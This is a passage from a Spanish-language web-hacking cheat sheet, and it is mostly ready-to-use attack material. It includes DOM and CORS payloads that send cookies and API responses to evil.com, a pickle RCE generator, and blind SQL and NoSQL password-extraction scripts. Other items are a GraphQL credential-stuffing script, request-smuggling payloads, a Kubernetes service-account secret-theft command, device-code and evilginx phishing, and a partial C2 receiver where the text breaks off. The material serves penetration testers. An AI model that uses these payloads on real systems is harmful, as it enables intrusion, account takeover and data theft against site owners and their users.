// - location.hash
// - location.search
// - location.pathname
// - document.referrer
// - window.name
// - postMessage data
// - URL parameters
```

### DOM Clobbering

```html
<!-- Sobrescribir variables JS con elementos HTML -->
<!-- Si el JS hace: if (someVar) { ... } -->

<!-- Anchor tag clobbering -->
<a id="config">{"isAdmin": true}</a>
<a id="config" href="https://evil.com">Config</a>

<!-- Form clobbering -->
<form id="loginForm">
  <input name="action" value="deleteAllUsers">
</form>

<!-- Si JS accede a: loginForm.action -> "deleteAllUsers" -->

<!-- Image clobbering -->
<img id="x" name="y">
<script>
// window.x.y existe como elemento HTML
</script>

<!-- Iframe clobbering -->
<iframe id="api" src="https://evil.com"></iframe>
<script>
// api.innerHMTL... o api.contentWindow...
</script>

<!-- Clobbering con <object> -->
<object id="navigator"></object>
<script>
// navigator.userAgent -> undefined (clobbered)
</script>

<!-- Clobbering para DOM XSS -->
<a id="defaultAvatar" href="x:alert(1)">
<script>
var avatar = defaultAvatar || 'default.png';
document.body.innerHTML = '<img src="' + avatar + '">';
</script>
```

### DOM Injection

```javascript
// Inyeccion via createElement
var div = document.createElement('div');
div.innerHTML = '<img src=x onerror=alert(1)>';
document.body.appendChild(div);

// Inyeccion via jQuery
$('#target').html('<img src=x onerror=alert(1)>');
$('#target').append('<script>alert(1)</script>');

// Inyeccion via DOMParser
var parser = new DOMParser();
var doc = parser.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
document.body.appendChild(doc.body.firstChild);

// Inyeccion via Range.createContextualFragment
var range = document.createRange();
var fragment = range.createContextualFragment('<img src=x onerror=alert(1)>');
document.body.appendChild(fragment);
```

### DOM-Based Open Redirect

```javascript
// Redireccion basada en DOM
var url = new URLSearchParams(location.search).get('next');
window.location = url;
location.href = url;
location.assign(url);

// Bypass de validacion parcial
// Si filter: startsWith('http://target.com')
// Bypass: http://target.com.evil.com/
// Bypass: http://target.com@evil.com/
// Bypass: http://target.com/evil.com
// Bypass: //evil.com (protocol-relative)
// Bypass: https://evil.com?http://target.com
```

### DOM-Based Cookie Manipulation

```javascript
// Cookie setting via DOM
document.cookie = 'session=' + encodeURIComponent(location.hash.substring(1));

// Cookie theft via DOM
var c = document.cookie;
fetch('https://evil.com/steal?c=' + encodeURIComponent(c));

// Cookie fixation via DOM
document.cookie = 'session=EVIL_SESSION_ID; path=/';

// Cookie deletion
document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
```

### DOM-Based Prototype Pollution

```javascript
// Prototype pollution basico
// Si el codigo hace merge de objetos:
function merge(a, b) {
    for (var key in b) {
        a[key] = b[key];
    }
}

// Exploit via JSON:
// {"__proto__": {"isAdmin": true}}
// Despues: obj.isAdmin -> true (hereda del prototipo)

// Otra via:
// {"constructor": {"prototype": {"isAdmin": true}}}

// Payloads comunes:
{"__proto__": {"polluted": true}}
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}

// Sinks de prototype pollution:
// - jQuery.extend()
// - Object.assign()
// - Lodash merge()
// - Express body-parser
// - Json.parse sin validacion
```

### DOM-based Vulnerabilities Detection

```bash
# DOM Invader (Burp extension)
# Activarlo en Burp -> Extender -> DOM Invader
# Analiza:
# - DOM XSS sinks
# - DOM clobbering
# - postMessage listeners

# ESLint con reglas de seguridad
# eslint-plugin-security
# eslint-plugin-no-unsanitized

# DOMPurify evasion
# Probar bypasses conocidos
```

<a name="cors"></a>
## 26. CORS Misconfiguration

### Origin Reflection (Null)

```javascript
// Origin: null -> servidor lo refleja en Access-Control-Allow-Origin: null
// Exploit desde iframe sandboxed:
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://target.com/api/sensitive', {
    credentials: 'include'
}).then(r => r.text()).then(d => {
    fetch('https://evil.com/steal?data=' + encodeURIComponent(d));
});
</script>"></iframe>

// Origin: null tambien desde:
// - file:// protocol
// - data: URIs
// - sandboxed iframes
```

### Credentialed Requests with Wildcard Origin

```http
# Response peligroso:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Esto no deberia funcionar (es invalido), pero algunos servidores lo tienen

# Lo correcto seria:
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

### Preflight Cache Bypass

```http
# El servidor cachea responses OPTIONS
# Si cachea por mucho tiempo, el atacante puede:

OPTIONS /api/sensitive
Access-Control-Max-Age: 86400  # 24 horas
# La proxima vez no se hace preflight

# Si el cache aplica a todos los origins, cualquier sitio puede explotar
```

### CORS Scanner con Burp

```bash
# Burp extension: CORS Scanner
# Escanea automaticamente:
# - Origin reflection
# - Wildcard origin with credentials
# - Null origin acceptance
# - Subdomain trust
# - Preflight bypass

# Mitos CORS comunes:
# - Access-Control-Allow-Origin: * es aceptable para APIs publicas (sin cookies)
# - Access-Control-Allow-Credentials: true CON * es invalido
# - Vary: Origin es necesario si el origen es dinamico
# - Los headers custom requieren preflight
```

### CORS Exploit Examples

```html
<!-- Exploit basico: fetch con credentials -->
<script>
fetch('https://target.com/api/profile', {
    credentials: 'include'
}).then(r => r.json()).then(d => {
    fetch('https://evil.com/exfil', {
        method: 'POST',
        body: JSON.stringify(d)
    });
});
</script>

<!-- Exploit con xhr -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/data', true);
xhr.withCredentials = true;
xhr.onload = function() {
    new Image().src = 'https://evil.com/steal?data=' + encodeURIComponent(xhr.responseText);
};
xhr.send();
</script>

<!-- Si solo permite un origen fijo (https://app.com), registrar subdominio -->
// Suponiendo que target.com confia en *.app.com
// Registrar https://evil.app.com para recibir datos

<!-- Origin: null con iframe -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/secret', true);
xhr.withCredentials = true;
xhr.onload = function() {
    var img = new Image();
    img.src = 'https://evil.com/steal?data=' + btoa(xhr.responseText);
};
xhr.send();
</script>">
</iframe>
```

<a name="discovery"></a>
## 27. Automated Discovery and Scanning

### ffuf - Workflow Completo

```bash
# Directory discovery basico
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Directory con extensiones
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.txt,.html,.xml,.json

# Virtual host discovery
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains-top1million.txt -fs 1234

# Subdomain discovery
ffuf -u http://FUZZ.target.com -w subdomains.txt

# Parameter fuzzing
ffuf -u http://target.com/page?FUZZ=test -w /usr/share/seclists/Fuzzing/paramMiner/params.txt
ffuf -u http://target.com/page?FUZZ=1 -w params.txt

# Value fuzzing
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt -fc 401
ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w ips.txt

# Header fuzzing
ffuf -u http://target.com -H "FUZZ: test" -w headers.txt
ffuf -u http://target.com -H "Authorization: FUZZ" -w tokens.txt

# Matchers y filtros
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234
ffuf -u http://target.com/FUZZ -w wordlist.txt -fw 100

# POST request file
ffuf -u http://target.com/FUZZ -w wordlist.txt -request req.txt

# Replay proxy (enviar hits a Burp)
ffuf -u http://target.com/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080

# Delay y rate limiting
ffuf -u http://target.com/FUZZ -w wordlist.txt -rate 50 -timeout 10

# Output
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json -of json
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.csv -of csv
```

### gau / waybackurls / Hakrawler / Katana

```bash
# gau - Get All URLs
gau target.com
gau target.com --subs
gau target.com --subs --providers wayback,otx,commoncrawl
gau target.com --o urls.txt

# waybackurls
echo "target.com" | waybackurls
waybackurls target.com > urls.txt

# Katana - crawler moderno
katana -u http://target.com
katana -u http://target.com -d 3
katana -u http://target.com -jc  # javascript crawling
katana -u http://target.com -o output.txt
katana -u http://target.com -silent

# Hakrawler
echo "http://target.com" | hakrawler
echo "http://target.com" | hakrawler -subs
echo "http://target.com" | hakrawler -depth 3

# Pipeline completo: discovery -> probing -> scanning
gau target.com | grep -E '\?.*=' | uro | httpx -silent | nuclei -t cves/ -t exposures/
```

### httpx - Probing

```bash
# Probing basico
echo "target.com" | httpx
cat urls.txt | httpx -silent

# Detectar tecnologias
cat urls.txt | httpx -silent -tech-detect

# Status code filter
cat urls.txt | httpx -mc 200,301

# Screenshot
cat urls.txt | httpx -silent -screenshot

# Title y webserver
cat urls.txt | httpx -silent -title -web-server -status-code

# Pipeline: subfinder -> httpx -> nuclei
subfinder -d target.com | httpx -silent | nuclei -t cves/
```

### Subfinder / Assetfinder

```bash
# Subfinder
subfinder -d target.com
subfinder -d target.com -o subdomains.txt
subfinder -d target.com -silent

# Assetfinder
assetfinder target.com
assetfinder --subs-only target.com

# Combinar y limpiar
subfinder -d target.com | assetfinder target.com | sort -u | httpx -silent

# Certificates transparency (crt.sh)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# dnsx - DNS probing
cat subdomains.txt | dnsx -a -resp
```

### nuclei - Templates Development

```yaml
# Template custom basico
id: custom-xss-detector

info:
  name: Custom XSS Detector
  author: researcher
  severity: medium
  tags: xss,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=<script>alert(1)</script>"
    
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body

# Template con multiple matchers
id: custom-sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/user?id=1'"
      - "{{BaseURL}}/user?id=1"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SQL"
          - "syntax"
          - "mysql"
        part: body
      
      - type: status
        status:
          - 500

# Template con extractors
id: extract-version

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    extractors:
      - type: regex
        part: body
        regex:
          - "WordPress ([0-9]+\.[0-9]+(\.[0-9]+)?)"
          - "Drupal ([0-9]+\.[0-9]+)"
```

### Generating Custom Wordlists

```bash
# Desde el target
cewl http://target.com -w wordlist.txt
cewl http://target.com -d 3 -m 5 -w wordlist.txt

# Desde URLs
gau target.com | unfurl -u paths | tr '/' '\n' | sort -u > wordlist.txt
gau target.com | unfurl -u keys | sort -u > params.txt

# Combinar con wordlists existentes
cat wordlist.txt /usr/share/seclists/Discovery/Web-Content/common.txt | sort -u > merged.txt

# basename de paths
katana -u http://target.com -silent | unfurl -u paths | xargs -I{} basename {} | sort -u

# Filtro de URLs
gau target.com | grep -E '\?.*=' | grep -vE '\?(utm_|fb_|ref=)' | uro > clean_urls.txt
```

### dalfox - XSS Automation

```bash
# Basico
dalfox url http://target.com/page?id=1
dalfox file urls.txt

# Pipe mode
gau target.com | dalfox pipe

# Blind XSS
dalfox url http://target.com --blind https://evil.com/hook

# Custom payload
dalfox url http://target.com --custom-payload my_payloads.txt

# WAF evasion
dalfox url http://target.com --waf-evasion

# Workers
dalfox url http://target.com --worker 50

# Output
dalfox url http://target.com -o results.txt --format json
```

### kxss - Reflected XSS Detection

```bash
# kxss detecta reflected XSS
echo "http://target.com/page?q=test" | kxss

# Desde archivo
cat urls.txt | kxss

# Combinado con gau
gau target.com | kxss

# Filtrar por caracteres reflejados
echo "http://target.com/page?name=test&id=1" | kxss
# Output: name might be reflected (test)
# Luego probar payloads manualmente

# Pipeline completo
gau target.com | grep -E '\?.*=' | kxss | grep -E '<>|\"|\''
```

### Pipeline Completo de Descubrimiento

```bash
# 1. Subdomain discovery
subfinder -d target.com -silent | tee subs.txt

# 2. Probing
cat subs.txt | httpx -silent -o alive.txt

# 3. URL discovery
cat alive.txt | katana -silent -o urls.txt
gau target.com >> urls.txt
cat alive.txt | waybackurls >> urls.txt

# 4. Clean URLs
cat urls.txt | grep -E '\?.*=' | uro > param_urls.txt

# 5. Scan
nuclei -l alive.txt -t cves/ -t exposures/ -t misconfiguration/
nuclei -l alive.txt -t technologies/
dalfox file param_urls.txt -w 50
cat param_urls.txt | kxss

# 6. Fuzzing
ffuf -u https://admin.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subs.txt

# 7. Report
nuclei -l alive.txt -json -o results.json
cat results.json | jq -r '.info.severity + ": " + .info.name'
```

---
## Recursos y Cheatsheets

### Wordlists Recomendadas

```bash
# Seclists (https://github.com/danielmiessler/SecLists)
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/seclists/Fuzzing/
/usr/share/seclists/Passwords/
/usr/share/seclists/Username/

# FuzzDB (https://github.com/fuzzdb-project/fuzzdb)
# PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
# PayloadBox (https://github.com/payloadbox)
```

### Herramientas Esenciales

```bash
# Reconnaissance
subfinder, assetfinder, amass, httpx, dnsx, naabu

# Crawling & Discovery
gau, waybackurls, katana, hakrawler, gospider, paramspider

# Scanning
nuclei, nikto, zap-cli, wpscan, joomscan, droopescan

# Fuzzing
ffuf, wfuzz, gobuster, dirsearch, feroxbuster

# Exploitation
sqlmap, xsstrike, commix, tplmap, nosqlmap, jwt_tool

# Proxies & Interception
[burp suite](../raw/w3b-h4ck1ng.md#burp-suite), [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) ZAP, mitmproxy, Caido

# Wordlist Generation
cewl, crunch, kwprocessor, rsgen, hashcat-utils

# Utilities
jq, httpx, unfurl, uro, anew, gf, qsreplace, interactsh
```

### Extensiones de Navegador para Pentesting

```bash
# Firefox / Chrome
- HackBar (HackBar Quantum)
- Wappalyzer (deteccion de tecnologias)
- FoxyProxy (cambio rapido de proxy)
- Cookie-Editor (editar cookies)
- User-Agent Switcher
- BuiltWith Technology Profiler
- Retire.js (JS libraries vulnerables)
- DOM Inspector
- EditThisCookie
```

### Checklist de Seguridad Web

```bash
# 1. Reconocimiento pasivo
#   - Subdominios
#   - URLs historicas
#   - Tecnologias detectadas
#   - Emails expuestos

# 2. Reconocimiento activo
#   - Directory busting
#   - Parameter discovery
#   - Virtual host discovery
#   - Port scanning

# 3. Autenticacion
#   - Login bypass
#   - Session management
#   - JWT attacks
#   - OAuth testing
#   - Rate limiting

# 4. Autorizacion
#   - IDOR
#   - Role escalation
#   - Missing function level access control
#   - Mass assignment

# 5. Input Validation
#   - SQLi
#   - XSS
#   - SSTI
#   - Command Injection
#   - SSRF
#   - LFI/RFI
#   - XXE
#   - NoSQLi

# 6. Business Logic
#   - Race conditions
#   - Coupon abuse
#   - Cart manipulation
#   - Workflow bypass

# 7. Infrastructure
#   - TLS/SSL testing
#   - HTTP headers analysis
#   - CSP evaluation
#   - CORS testing
#   - HTTP methods

# 8. Post-exploitation
#   - Data exfiltration
#   - Persistence
#   - Pivoting
#   - Log cleaning
```

### Extra: Broken Access Control

```bash
# Categorias OWASP Top 10: AC-1 Broken Access Control

# Falta de controles en metodos HTTP
POST /api/admin/deleteUser
PUT /api/orders/changeStatus
DELETE /api/users

# Role-based access control bypass
# Probar endpoints de admin como user normal
# Probar cambiar role en JWT/session
# Probar forced browsing: /admin, /api/admin

# CORS misconfig + API abuse
# Origin: null
# Origin: attacker.com

# Bypass de restricciones de IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
X-Remote-IP: 10.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=10.0.0.1;by=127.0.0.1

# Parameter-based access control
/admin.jsp?admin=true
/admin?access=full
/user?role=admin
/dashboard?debug=true
/api/users?isAdmin=true
```

### Extra: Deserialization Attacks

```python
# Python Pickle RCE
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())

# PHP unserialize RCE
# O:8:"stdClass":1:{s:4:"test";s:10:"system('id')";}

# Java deserialization con ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
curl -X POST http://target.com/ --data-binary @payload.bin

# .NET ViewState deserialization
# Si el ViewState no tiene MAC validation
# Herramienta: ysoserial.net
```

### Extra: Insecure Cryptography

```bash
# Hash cracking
hashcat -m 0 -a 0 hashes.txt rockyou.txt     # MD5
hashcat -m 100 -a 0 hashes.txt rockyou.txt    # SHA1
hashcat -m 1400 -a 0 hashes.txt rockyou.txt   # SHA256

# Weak password hashing
# MD5, SHA1 sin salt -> rainbow table
# bcrypt cost < 10 -> debil
# No salt -> pre-computed tables

# Weak encryption
# ECB mode -> deterministic blocks
# CBC with IV fijo -> predecible
# RC4 -> known biases
# DES -> 56-bit keys (brute forceable)

# Predictable random
# PHP: rand() vs mt_rand()
# Java: Random vs SecureRandom
# Node: Math.random() predecible

# Probar:
# - Identificar algoritmo de hash
# - Probar fuerza de password
# - Identificar modo de operacion
# - Predecir tokens de sesion
```

### Extra: Logging and Monitoring Bypass

```bash
# Evadir logging
# Usar HTTP/2 (algunos loggers no lo capturan)
# Usar chunked encoding
# Usar IPs falsas en headers
# Usar Tor o proxies

# Evadir rate limiting
# Rotar IPs
# Rotar User-Agent
# Rotar cookies
# Usar HTTP/2 multiplexing

# Evadir WAF
# Encoding multiple
# Chunked encoding
# HTTP/2
# HTTPS downgrade
# Parameter pollution
```

### Extra: Mobile API Testing

```bash
# Android
# Extraer APK
[apktool](../raw/4pk-r3v3rs1ng.md#apktool) d app.[apk](../raw/4pk-r3v3rs1ng.md) -o app_extracted/
# Revisar AndroidManifest.xml
# Buscar API keys en smali/
# Buscar endpoints en resources/
# Buscar en lib/ (native code)

# iOS
# Extraer IPA
unzip app.ipa -d app_extracted/
# Revisar Info.plist
# Buscar en Frameworks/
# Buscar en .nib files

# Interceptar trafico mobile
# Configurar proxy en WiFi
# Instalar CA certificate
# Burp Proxy + Mobile Assistant
# Android emulator + mitmproxy

# SSL Pinning bypass
# Frida: frida -U -l ssl_pinning_bypass.js com.target.app
# Objection: objection -g com.target.app explore
# Xposed: JustTrustMe module
```

### Extra: Advanced SQLi Techniques

```sql
-- DNS exfiltracion automatizada
-- Python script
'''
import requests, dns.resolver

def sqli_dns_exfil(url, query, domain):
    result = ""
    for i in range(1, 100):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{i},1))={ord(c)},SLEEP(2),0)-- "
            r = requests.get(url, params={"id": payload})
            
            # Tambien se puede exfiltrar por DNS
            dns_payload = f"1' AND LOAD_FILE(CONCAT('\\\\',(SELECT MID(({query}),{i},1)),'.{domain}\\test'))-- "
            r = requests.get(url, params={"id": dns_payload})
            time.sleep(0.5)
    return result
'''

-- WAF bypass avanzado
-- HTTP/2 via h2c
-- WebSocket tunneling
-- gRPC tunneling
-- DNS tunneling
-- HTTP/2 multiplexing

-- Blind SQLi con machine learning
-- Usar SVM o Random Forest para clasificar true/false
-- Cuando las diferencias son minimas
```

### Extra: Container and Kubernetes Security

```bash
# Docker escape desde webshell
# Verificar si estamos en container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Escape via privileged mode
fdisk -l  # si hay discos montados
mount /dev/sda1 /mnt
chroot /mnt

# Escape via capabilities
capsh --print

# Kubernetes pod breakout
# Service account token en /var/run/secrets/kubernetes.io/serviceaccount/
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/[kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md).io/serviceaccount/token)" https://[kubernetes](../raw/k8s-d33p-d1v3.md).default.svc/api/v1/namespaces/default/secrets

# kubectl from inside pod
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.24.0/bin/linux/amd64/kubectl
chmod +x ./kubectl
./kubectl get pods --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify
```

### Extra: GraphQL Batching for Credential Stuffing

```python
import requests, json, sys

url = "http://target.com/graphql"
usernames = open("users.txt").read().splitlines()
passwords = open("passwords.txt").read().splitlines()

# Batch query
batch = []
for user in usernames[:50]:
    for passwd in passwords[:10]:
        batch.append({
            "query": f'mutation {{ login(username: "{user}", password: "{passwd}") {{ token }} }}'
        })

r = requests.post(url, json=batch)
results = r.json()
for i, res in enumerate(results):
    if 'errors' not in res and res.get('data', {}).get('login', {}).get('token'):
        print(f"[+] Valid: {usernames[i//len(passwords)]}:{passwords[i%len(passwords)]}")
```

### Extra: Serverless Event Injection

```json
// [aws](../raw/cl0ud-h4ck1ng.md#aws) Lambda event injection
// Lambda recibe eventos de SQS, [s3](../raw/cl0ud-h4ck1ng.md#s3), API Gateway, etc.
// Probar injectar datos maliciosos en los campos del evento

// S3 event injection
{
  "Records": [
    {
      "s3": {
        "bucket": {"name": "my-bucket"},
        "object": {"key": "../../../etc/passwd"}
      }
    }
  ]
}

// SQS event injection
{
  "Records": [
    {
      "body": "' OR '1'='1",
      "messageAttributes": {
        "command": {"stringValue": "id"}
      }
    }
  ]
}

// API Gateway event
// Probar inyeccion en pathParameters, queryStringParameters, body
// Si la Lambda usa esos valores sin sanitizar
```

### Extra: HTTP/2 Specific Attacks

```bash
# HTTP/2 request smuggling
# HTTP/2 no tiene Transfer-Encoding
# Pero puede ser downgradeado a HTTP/1.1

# HTTP/2 HPACK bomb
# HPACK compression puede ser usado para DoS
# Enviar headers altamente comprimidos que se expanden en el server

# HTTP/2 RST flood
# Enviar RST_STREAM frames continuamente
# El server gasta recursos abriendo y cerrando streams

# HTTP/2 SETTINGS frame flood
# Enviar constantes cambios de SETTINGS
# El server procesa cada cambio

# HTTP/2 PING flood
# Enviar PING frames (el server responde con PONG)
# Consume CPU del server

# HTTP/2 PRIORITY tree DoS
# Crear arbol de dependencias complejo
# Consume CPU y memoria del server

# HTTP/2 timeout issues
# Enviar headers pero nunca terminar el body
# El server espera timeout

# curl con HTTP/2
curl --http2 http://target.com
curl --http2-prior-knowledge http://target.com
curl -H "Host: target.com" --http2 https://target.com
```

### Extra: Web Cache Poisoning Techniques

```bash
# Cache poisoning via unkeyed headers
# Si el cache no incluye X-Forwarded-Host en la key
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# -> El cache guarda / con contenido de evil.com

# Cache poisoning via Host header
GET / HTTP/1.1
Host: evil.com
# Si el server refleja el Host, queda cacheado

# Cache poisoning via cookie
GET / HTTP/1.1
Cookie: session=malicious
# Si el contenido cambia segun la cookie pero no es parte de la cache key

# Cache poisoning via unkeyed query params
GET /?utm_source=evil
# Si el cache no usa utm_source en la key

# Cache key injection
# CRLF injection en headers que son parte de la key
# Inyectar 

 para dividir la cache key

# Web cache deception
# Hacer que el cache guarde contenido autenticado
GET /private/profile.css
# Si el server trata /private/profile.css como archivo estatico
# Pero en realidad es dinamico con datos de sesion
# El cache lo guarda y cualquiera puede verlo

# Cache poisoning tools
# Burp extension: Web Cache Deception Scanner
# Param Miner detecta unkeyed params
# https://github.com/portswigger/param-miner
```

### Extra: HTTP Request Smuggling - Advanced Payloads

```http
# CL.TE con body truncado
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

X

# TE.CL con chunked malformado
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Length: 15

x=1
0

# TE.TE con header duplicado
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: x
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST /admin HTTP/1.1

# CL.0 (no TE, no CL -> CL=0)
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com

# HTTP/2 downgrade
:method POST
:path /
:authority target.com
content-length: 0
transfer-encoding: chunked
```

### Extra: Server-Side Prototype Pollution

```javascript
// Node.js prototype pollution
// Si el server hace merge de objetos (body-parser, express)

// Payload:
{"__proto__": {"isAdmin": true}}

// Si el server checkea:
if (user.isAdmin) { ... }
// -> TRUE porque hereda del prototipo

// Otra forma:
{"constructor": {"prototype": {"isAdmin": true}}}

// Pollution para RCE via:
// - child_process.spawn
// - exec
// - template engines

// Ejemplo con template engine:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"}}

// Deteccion:
// Enviar JSON con __proto__
// Ver si el comportamiento cambia
// Ver si se refleja en la respuesta

// Herramientas:
// - server-side-prototype-pollution-scanner (Burp)
```

### Extra: Advanced NoSQL Injection Techniques

```python
# Blind NoSQLi extraction
import requests, string, time

url = "http://target.com/api/login"
chars = string.ascii_letters + string.digits
password = ""

for i in range(32):  # max 32 chars
    found = False
    for c in chars:
        # Usando $regex para blind extraction
        regex = f"^{password}{c}"
        payload = {
            "username": "admin",
            "password": {"$regex": regex}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"[+] Password so far: {password}")
            found = True
            break
    if not found:
        # Time-based
        for c in chars:
            payload = {
                "username": "admin",
                "$where": f"this.password.startsWith('{password}{c}') && sleep(1000)"
            }
            start = time.time()
            r = requests.post(url, json=payload)
            elapsed = time.time() - start
            if elapsed > 0.8:
                password += c
                print(f"[+T] Password so far: {password}")
                found = True
                break
    if not found:
        print(f"[*] Password found: {password}")
        break
```

### Extra: OAuth 2.0 Device Code Grant Phishing

```http
# OAuth 2.0 Device Code Grant
# Usado en dispositivos sin navegador (smart TVs, consolas)

# 1. Solicitar device code
POST /oauth/device/code
client_id=app
scope=openid+profile+email

# Response:
{
    "device_code": "ABC123",
    "user_code": "DEF-456",
    "verification_uri": "https://target.com/device",
    "interval": 5
}

# 2. Phishing: mandar al usuario a verification_uri
# Y pedirle que ingrese DEF-456

# 3. Mientras tanto, hacer polling:
POST /oauth/token
grant_type=urn:ietf:params:oauth:grant-type:device_code
device_code=ABC123

# 4. Cuando el usuario autoriza, recibis el token

# Ataque:
# - Crear pagina de phishing identica
# - El usuario autoriza sin saber que le dan acceso al atacante
# - El atacante obtiene refresh token de larga duracion
```

### Extra: Business Logic Vulnerabilities

```bash
# Flujo de pago manipulado
# Cambiar precio en request
POST /checkout
{"items": [{"id": 1, "price": 0.01, "quantity": 100}], "total": 1.00}

# Negative quantity
POST /cart/add
{"product_id": 1, "quantity": -100}
# Si el sistema resta stock, podes generar stock infinito

# Integer overflow
POST /cart/add
{"product_id": 1, "quantity": 9999999999999999}
# Si el sistema no valida, puede causar overflow a 0 o negativo

# Currency manipulation
POST /checkout
{"currency": "USD", "amount": 100}
# Si cambias la currency, pagas 100 en vez de 100 USD

# Coupon stacking
POST /cart/apply-coupon
{"code": "FREESHIPPING"}
POST /cart/apply-coupon
{"code": "SAVE50"}

# Gift card balance check bypass
POST /checkout
{"gift_card": "card_id", "amount": 999999}

# Email verification bypass
# Completar registro sin verificar email
# Cambiar email despues de verificacion
# Usar email temporal + verificar

# 2FA bypass
# Probar si se puede:
# - Omitir el paso 2FA
# - Acceder directamente a dashboard sin 2FA
# - Reusar codigo 2FA
# - Brute force de codigos de 6 digitos (10000 combinaciones)
```

### Extra: GraphQL Abuse Patterns

```graphql
# Alias-based data theft
query {
  legit: user(id: 1) { name, email }
  steal: user(id: 2) { password, creditCard }
}

# Field duplication para rate limit bypass
query {
  u1: user(id: 1) { name, email, password }
  u2: user(id: 1) { name, email, password }
  u3: user(id: 1) { name, email, password }
}

# Mutation abuse
mutation {
  updateUser(id: 1, input: {role: "admin"}) { id, role }
  deleteUser(id: 2) { id }
  createAdmin(input: {username: "hacker", password: "hacked"}) { id }
}

# Directive-based injection
query {
  user(id: "1") @include(if: true) { name }
  user(id: "1' OR '1'='1") @skip(if: false) { name }
}

# Fragment abuse
fragment AdminFields on User {
  secretToken
  backupCodes
  ssoKey
}

query {
  user(id: 1) {
    ...AdminFields
    name
  }
}

# Union type confusion
{
  search(term: "admin") {
    ... on User { password, ssn }
    ... on Admin { secretKey, permissions }
  }
}
```

### Extra: Tools Cheatsheet - One-Liners

```bash
# One-liners utiles para pentesting web

# Live hosts
subfinder -d target.com | httpx -silent -mc 200

# URLs con parametros
gau target.com | grep -E '\?.*='

# Endpoints JS
katana -u target.com -jc | grep -E '\\.js' | sort -u

# Posibles endpoints API
gau target.com | grep -E '/api/|/v1/|/v2/|/rest/' | sort -u

# XSS automatico
gau target.com | grep -E '\?.*=' | dalfox pipe -w 50

# SQLi automatico
gau target.com | grep -E '\?id=' | while read u; do sqlmap -u "$u" --batch; done

# Open redirect
gau target.com | grep -E '(redirect|return|next|url|path|dest|target)=http' | sort -u

# LFI potential
gau target.com | grep -E '(page|file|path|dir|include|require)=[a-z]' | sort -u

# SSTI test
ffuf -u "http://target.com/FUZZ" -w /usr/share/seclists/Fuzzing/SSTI.txt -mr "49|7777777"

# CORS test
curl -H "Origin: https://evil.com" -I http://target.com | grep -i 'access-control'

# Tecnologias detectadas
curl -s http://target.com | grep -iE '(wordpress|drupal|joomla|laravel|django|rails|express)'

# Todo en uno:
subfinder -d target.com | httpx -silent | tee alive.txt
cat alive.txt | katana -silent -o urls.txt
cat alive.txt | nuclei -t cves/ -t exposures/ -json -o vulns.json
```

### Extra: Red Team Infrastructure Setup

```bash
# Servidor C2 basico para recepcion de datos
# Usar un VPS con dominio propio

# nginx reverse proxy para ocultar C2
server {
    listen 443 ssl;
    server_name cdn.target.com;
    location / {
        proxy_pass http://127.0.0.1:8080;
    }
}

# Phishing con EvilGinx
evilginx2 -p 443

# Servidor de recepcion de datos (PHP)
<?php
$data = file_get_contents('php://input');
